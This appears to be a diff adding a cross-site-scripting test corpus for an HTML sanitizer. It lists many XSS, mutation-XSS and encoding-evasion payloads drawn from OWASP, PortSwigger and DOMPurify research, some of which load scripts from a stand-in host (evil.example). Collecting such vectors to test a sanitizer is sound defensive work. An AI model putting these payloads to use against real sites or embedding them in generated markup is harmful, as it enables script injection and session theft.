@@ -1,0 +1,205 @@
+>>> note: Sanitizer bypass corpus — long-tail / mXSS / obfuscation vectors.
+>>> note: Format (parsed by tests/bypass_corpus.rs):
+>>> note:   ">>> category: <name>"  sets the category for the vectors that follow
+>>> note:   ">>> source: <name>"    sets the provenance label for the vectors that follow
+>>> note:   ">>> note: <text>"      human documentation, ignored by the loader
+>>> note:   <blank line>            skipped
+>>> note:   anything else           a PAYLOAD, taken VERBATIM
+>>> note: The ONLY reserved prefix is ">>>", so raw vectors (even ones starting
+>>> note: with # or //) paste in unchanged — see SOURCES.md for the re-sync recipe.
+>>> note: Every vector MUST be neutralized: no <script>, no on*=, no
+>>> note: javascript:/vbscript:/data: in a navigation attribute. A survivor is a
+>>> note: sanitizer-contract hole (defense-in-depth framing is in the test header).
+>>> note: Inline-style CSS and ARIA-tree vectors are intentionally NOT here.
+
+>>> source: owasp-xss-filter-evasion
+>>> category: script
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script >alert(1)</script>
+<script   type="text/javascript">alert(1)</script>
+<script src=//evil.example/x.js></script>
+<script/src=//evil.example/x.js></script>
+<script src=//evil.example/x.js defer></script>
+<script>/*comment*/alert(1)/*comment*/</script>
+<script>alert`1`</script>
+<script type=module>import('//evil.example/x.js')</script>
+<script type="text/vbscript">msgbox(1)</script>
+<scri<script>pt>alert(1)</scri</script>pt>
+<SCRIPT/XSS SRC="http://evil.example/x.js"></SCRIPT>
+<SCRIPT/SRC="http://evil.example/x.js"></SCRIPT>
+<table background="javascript:alert(1)"></table>
+
+>>> source: svg-script-surface
+>>> category: script
+<svg><script>alert(1)</script></svg>
+<svg><script href="data:text/javascript,alert(1)"/></svg>
+<svg><script xlink:href="data:text/javascript,alert(1)"/></svg>
+<svg><script>confirm(1)</script></svg>
+
+>>> source: portswigger-cheatsheet
+>>> category: event-handler
+<img src=x onerror=alert(1)>
+<img src=x ONERROR=alert(1)>
+<img src=x OnErRoR=alert(1)>
+<img src=x onerror=alert(1)//>
+<svg onload=alert(1)></svg>
+<svg/onload=alert(1)></svg>
+<svg onload=alert(1)//></svg>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)>
+<body onresize=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onfocusin=alert(1) tabindex=1>
+<select autofocus onfocus=alert(1)><option>x</option></select>
+<textarea autofocus onfocus=alert(1)></textarea>
+<keygen autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>x</details>
+<marquee onstart=alert(1)>x</marquee>
+<video><source onerror=alert(1)></video>
+<audio src=x onerror=alert(1)>
+<video src=x onloadstart=alert(1)>
+<video><track default onload=alert(1)></video>
+<a onmouseover=alert(1)>x</a>
+<a/onmouseover=alert(1)>xx</a>
+<div onpointerenter=alert(1)>x</div>
+<div onpointerrawupdate=alert(1)>x</div>
+<div onanimationstart=alert(1) style="animation-name:x">x</div>
+<div ontransitionend=alert(1)>x</div>
+<form onsubmit=alert(1)><input type=submit></form>
+<isindex onfocus=alert(1) autofocus>
+<img src=x:x onerror=alert(1)>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
+
+>>> source: svg-animation-surface
+>>> category: event-handler
+<svg><animate onbegin=alert(1) attributeName=x dur=1s/></svg>
+<svg><set onbegin=alert(1) attributeName=x to=y/></svg>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction></math>
+
+>>> source: owasp-xss-filter-evasion
+>>> category: js-url
+<a href="javascript:alert(1)">x</a>
+<a href="JaVaScRiPt:alert(1)">x</a>
+<a href="JAVASCRIPT:alert(1)">x</a>
+<a href=" javascript:alert(1)">x</a>
+<a href="&#32;javascript:alert(1)">x</a>
+<a href="java&#x09;script:alert(1)">x</a>
+<a href="java&#x0a;script:alert(1)">x</a>
+<a href="java&#x0d;script:alert(1)">x</a>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="&#x6a;avascript:alert(1)">x</a>
+<a href="&#0000106avascript:alert(1)">x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="VBScript:msgbox(1)">x</a>
+<a href="data:text/html,<script>alert(1)</script>">x</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="javascript:alert(1)" onclick="alert(2)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<a href="&NewLine;javascript:alert(1)">x</a>
+<img src="javascript:alert(1)">
+<img dynsrc="javascript:alert(1)">
+<input type=image src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit></form>
+<button formaction="javascript:alert(1)">x</button>
+<object data="javascript:alert(1)"></object>
+
+>>> source: awh-svg-href-surface
+>>> note: Probes scheme-filtering on the href/xlink:href we ADD to <a>/<use>/<textPath>.
+>>> note: These are the highest-value config-specific vectors in this corpus.
+>>> category: svg-href
+<svg><a xlink:href="javascript:alert(1)"><text x=10 y=10>x</text></a></svg>
+<svg><a href="javascript:alert(1)"><text x=10 y=10>x</text></a></svg>
+<svg><a xlink:href="JaVaScRiPt:alert(1)"><text>x</text></a></svg>
+<svg><a xlink:href="data:text/html,<script>alert(1)</script>"><text>x</text></a></svg>
+<svg><use href="javascript:alert(1)"/></svg>
+<svg><use xlink:href="javascript:alert(1)"/></svg>
+<svg><use xlink:href="data:image/svg+xml,<svg/onload=alert(1)>"/></svg>
+<svg><textPath href="javascript:alert(1)">x</textPath></svg>
+<svg><textPath xlink:href="javascript:alert(1)">x</textPath></svg>
+<svg><animate attributeName="href" to="javascript:alert(1)"/></svg>
+<svg><animate attributeName="xlink:href" to="javascript:alert(1)"/></svg>
+<svg><set attributeName="href" to="javascript:alert(1)"/></svg>
+<svg><a><animate attributeName="xlink:href" from="x" to="javascript:alert(1)" dur="1s"/></a></svg>
+<svg><image href="x" onerror="alert(1)"/></svg>
+<svg><image xlink:href="javascript:alert(1)"/></svg>
+
+>>> source: cure53-dompurify-mxss
+>>> category: mxss
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>
+<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<svg><p><style><!--</style><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noembed><img src=x onerror=alert(1)></noembed>
+<noframes><img src=x onerror=alert(1)></noframes>
+<select><noembed></select><img src=x onerror=alert(1)>
+<template><img src=x onerror=alert(1)></template>
+<template><script>alert(1)</script></template>
+<title><img src=x onerror=alert(1)></title>
+<title></title><img src=x onerror=alert(1)>
+<textarea><img src=x onerror=alert(1)></textarea>
+<xmp><img src=x onerror=alert(1)></xmp>
+<style><img src=x onerror=alert(1)></style>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)//]]></svg>
+<svg><foreignObject><body onload=alert(1)>x</body></foreignObject></svg>
+<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>
+<!--><script>alert(1)</script>-->
+<!-- --><script>alert(1)</script>
+<![CDATA[<script>alert(1)</script>]]>
+<comment><img src=x onerror=alert(1)></comment>
+
+>>> source: portswigger-cheatsheet
+>>> category: meta-base-embed
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<base href="javascript:">
+<base href="//evil.example/">
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<frameset><frame src="javascript:alert(1)"></frameset>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<embed src="//evil.example/x.swf" allowscriptaccess=always>
+<applet code="Evil.class"></applet>
+<link rel="stylesheet" href="https://evil.example/x.css">
+<link rel="import" href="https://evil.example/x.html">
+<link rel="preload" href="javascript:alert(1)">
+
+>>> source: owasp-xss-filter-evasion
+>>> category: encoding
+<IMG SRC=`javascript:alert(1)`>
+<IMG SRC=javascript:alert(1)>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<IMG SRC=# onmouseover="alert(1)">
+<IMG onmouseover="alert(1)">
+<IMG SRC=/ onerror="alert(1)">
+<IMG SRC=&#106;avascript:alert(1)>
+<IMG SRC=&#0000106avascript:alert(1)>
+<IMG SRC="jav&#x09;ascript:alert(1);">
+<IMG SRC="jav&#x0A;ascript:alert(1);">
+<IMG SRC=" &#14;  javascript:alert(1);">
+<<SCRIPT>alert(1);//<</SCRIPT>
+<SCRIPT>alert(1)</SCRIPT
+<iframe src=http://evil.example/x.html <
+
+>>> source: portswigger-cheatsheet
+>>> category: markup-mutation
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</script><script>alert(1)</script>
+<p/onmouseover=alert(1)>x</p>
+<a"><img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)//
+<svg><g/onload=alert(1)></g></svg>
+<div id="><img src=x onerror=alert(1)>">x</div>
